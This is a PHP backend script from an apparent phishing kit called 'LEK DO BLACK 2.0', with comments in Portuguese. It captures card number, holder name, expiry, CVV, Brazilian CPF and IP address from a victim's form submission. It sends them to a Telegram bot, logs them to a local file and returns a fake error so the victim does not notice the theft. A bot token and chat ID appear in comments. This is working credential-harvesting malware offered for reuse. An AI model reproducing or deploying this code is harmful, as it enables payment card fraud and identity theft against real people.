<?php
// LEK DO BLACK 2.0 - CAPTURA DE CARTÃO
// TROQUE AS LINHAS ABAIXO PELOS SEUS DADOS

$bot_token = "SEU_TOKEN_AQUI";   // 8383419436:AAGIiGuhI9UiyOuvSZy_dNWrd0yz-_c_T6U
$chat_id = "6832775799";         // 6832775799

// Pega os dados que a vítima digitou
$dados = json_decode(file_get_contents('php://input'), true);

$numero = $dados['numero'] ?? '';
$nome = $dados['nome'] ?? '';
$validade = $dados['validade'] ?? '';
$cvv = $dados['cvv'] ?? '';
$cpf = $dados['cpf'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$data = date("d/m/Y H:i:s");

// Monta a mensagem que vai pro Telegram
$mensagem = "💳💳💳 NOVA VÍTIMA 💳💳💳\n";
$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
$mensagem .= "💳 Número: $numero\n";
$mensagem .= "👤 Nome: $nome\n";
$mensagem .= "📅 Validade: $validade\n";
$mensagem .= "🔢 CVV: $cvv\n";
$mensagem .= "📄 CPF: $cpf\n";
$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
$mensagem .= "📍 IP: $ip\n";
$mensagem .= "📅 Data: $data\n";
$mensagem .= "━━━━━━━━━━━━━━━━━━\n";
$mensagem .= "🐺 LEK DO BLACK 2.0";

// Envia pro Telegram
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $mensagem
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Salva backup
$arquivo = fopen("cartoes.txt", "a");
fwrite($arquivo, "[$data] $numero | $nome | $validade | $cvv | $cpf | $ip\n");
fclose($arquivo);

// Responde com erro falso (a vítima acha que deu problema)
echo json_encode(['success' => false, 'message' => 'Erro no processamento']);
?>